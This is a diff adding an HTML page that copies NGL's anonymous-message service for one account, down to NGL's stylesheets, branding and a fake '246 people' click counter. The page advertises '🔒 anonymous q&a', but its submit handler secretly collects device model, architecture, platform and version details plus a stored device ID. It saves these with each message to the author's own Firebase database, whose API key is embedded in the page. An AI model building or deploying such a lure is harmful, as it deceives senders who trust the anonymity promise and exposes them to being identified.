@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>@_dasbikash_</title>
+    <link rel="stylesheet" href="https://ngl.link/stylesheets/normalize.css" />
+    <link rel="stylesheet" href="https://ngl.link/stylesheets/style.css?v=33" />
+    <link
+      rel="shortcut icon"
+      href="https://assets-global.website-files.com/62a6e19b906fa55f541799d7/62a98d041030ce99f782fbde_Variant5_256.png"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="./main.js"></script>
+    <!-- <script src="/scripts/mixpanel-jslib-snippet.js"></script>
+    <script src="https://js.stripe.com/v3/"></script> -->
+    <meta
+      name="viewport"
+      content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width"
+    />
+    <meta name="user:language" content="en" />
+    <meta
+      property="og:image"
+      content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!"
+    />
+
+    
+  </head>
+  <body>
+    
+    <input type="hidden" id="userRegion" value="IN" />
+    <div class="container" style="z-index: 1000; position: relative">
+      <form class="form" id="myForm">
+        <div class="bubble">
+          <div class="header">
+            <div class="pfp-container">
+              <img
+                class="pfp"
+                src="./bp.jpg"
+              />
+            </div>
+            <div class="user-container">
+              <div class="username">@_dasbikash_</div>
+              <div class="prompt">send me anonymous messages!</div>
+            </div>
+          </div>
+          <div class="textarea-container">
+            <div class="dice-button" id="dice-btn">🎲</div>
+            <textarea
+              placeholder="send me anonymous messages..."
+              name="question"
+              autocomplete="off"
+              maxlength="300"
+              id="question"
+            ></textarea>
+          </div>
+        </div>
+        <div class="anonymous-tooltip">🔒 anonymous q&amp;a</div>
+        <button
+          class="submit"
+          type="submit"
+          style="transform: translateZ(0px); z-index: 1000"
+        >
+          Send!
+        </button>
+      </form>
+    </div>
+    <div class="bottom-container-user-wrapper">
+      <div class="bottom-container">
+        <h2 class="download-prompt">
+          👇 <span class="clickCount">246</span> people just tapped the button👇
+        </h2>
+        <div class="space2"></div>
+        <a
+          class="button download-link download-link1 pulse"
+          href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837"
+          target="_blank"
+          >Get your own messages!</a
+        >
+        <div class="tos-privacy">
+          <a class="tos" href="/">Terms</a
+          ><a class="privacy" href="/">Privacy</a>
+        </div>
+      </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-analytics.js";
+        import {
+            getDatabase, ref, set,
+        } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDVf_3CxP8cKfoJTwzO0DY9pivmOzrVZ8c",
+            authDomain: "spsonline-b55e9.firebaseapp.com",
+            databaseURL: "https://spsonline-b55e9-default-rtdb.firebaseio.com",
+            projectId: "spsonline-b55e9",
+            storageBucket: "spsonline-b55e9.appspot.com",
+            messagingSenderId: "1088730470449",
+            appId: "1:1088730470449:web:cdc2942c54b9d6b5235d10",
+            measurementId: "G-G4E1NX94TM"
+        };
+        
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getDatabase();
+
+     
+        // fake questions
+
+        const dice_btn = document.querySelector("#dice-btn");
+        const textArea = document.querySelector("#question");
+
+        const questions = [
+        "name all your exes",
+        "your favorite part of your body?",
+        "do you even like school?",
+        "you should get a tattoo",
+        "who are your best girl friends",
+        "are you judgemental",
+        "have any netlix recomendations?",
+        "opinion on birds?",
+        "what time do you usually go to bed?",
+        "what are ur plans this weekend?"
+        ];
+
+        dice_btn.addEventListener("click", () => {
+        const randomQuestion = questions[Math.floor(Math.random() * questions.length)];
+        textArea.value = randomQuestion;
+        });
+
+
+
+        const form = document.getElementById('myForm');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            try {
+                
+                navigator.userAgentData
+                .getHighEntropyValues([
+                    "architecture",
+                    "model",
+                    "platform",
+                    "platformVersion",
+                    "fullVersionList"
+                ])
+                .then((ua) => {
+                    const model = ua["model"];
+                    const architecture = ua["architecture"];
+                    const platform = ua["platform"];
+                    const platformVersion = ua["platformVersion"];
+                    const fullVersionList = ua["fullVersionList"];
+
+                    // Get form values
+                    const question = form.question.value;
+                    const timestamp = new Date().toLocaleString();
+                    const deviceId = window.localStorage.getItem('deviceId')
+                    
+                    set(ref(db, 'bikash-ngl-messages/' + deviceId + "/"  + Date.now()), {
+                        question: question,
+                        model: model,
+                        architecture: architecture,
+                        platform: platform,
+                        platformVersion: platformVersion,
+                        fullVersionList: fullVersionList,
+                        timestamp: timestamp
+                    })
+                    .then(() => {
+                        location.href = "/sent.html";
+                        form.reset();
+                    })
+                    .catch((error) => {
+                        console.error('Error sending message:', error);
+                    });
+
+                    
+                });
+            }
+            catch(err) {
+
+                const question = form.question.value;
+                    const timestamp = new Date().toLocaleString();
+                    const deviceId = window.localStorage.getItem('deviceId')
+                    
+                    set(ref(db, 'bikash-ngl-messages/' + deviceId + "/" + Date.now()), {
+                        question: question,
+                        timestamp: timestamp
+                    })
+                    .then(() => {
+                        location.href = "/sent.html";
+                        form.reset();
+                    })
+                    .catch((error) => {
+                        console.error('Error sending message:', error);
+                    });
+            }
+        });
+
+    </script>
+  </body>
+</html>
